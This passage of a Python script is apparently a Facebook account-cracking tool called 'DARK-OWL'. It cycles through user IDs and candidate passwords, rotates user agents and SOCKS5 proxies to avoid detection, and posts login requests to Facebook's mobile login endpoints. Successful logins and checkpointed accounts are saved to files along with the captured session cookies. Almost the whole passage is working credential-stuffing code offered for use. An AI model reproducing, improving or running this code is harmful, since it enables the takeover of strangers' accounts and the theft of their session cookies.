			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;91m[DARK-CP] {idf} | {pw}')
				open(f'/sdcard/dark-CP.txt', 'a').write(idf+'|'+pw+'\n')
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\r\x1b[38;5;46m[DARK-OWL-OK💉] '+idf+ ' | '+pw+'|'+kuki+'\n')
				open(f'/sdcard/dark-OK.txt', 'a').write(idf+'|'+pw+'\n')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(10)
	loop+=1
	
	
def mbasic(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ses = requests.Session()
	sys.stdout.write(f"\r{bo} [DARK-OWL] {h}{loop}|{len(id)} | {h}{ok} ")
	sys.stdout.flush()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;91m[DARK-CP] {idf} | {pw}')
				open(f'/sdcard/dark-CP.txt', 'a').write(idf+'|'+pw+'\n')
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\r\x1b[38;5;46m[DARK-OWL-OK💉] '+idf+ ' | '+pw+'|'+kuki+'\n')
				open(f'/sdcard/dark-OK.txt', 'a').write(idf+'|'+pw+'\n')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(10)
	loop+=1
	
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

#>>>>> THANKs for usage hi <<<<<<<#
#>>>>>MICHAEL<<<
#####<<#
###1
####2
#####3
######4
########5
##########6
#############7
###############8
#################9
###################10
####done fr Good
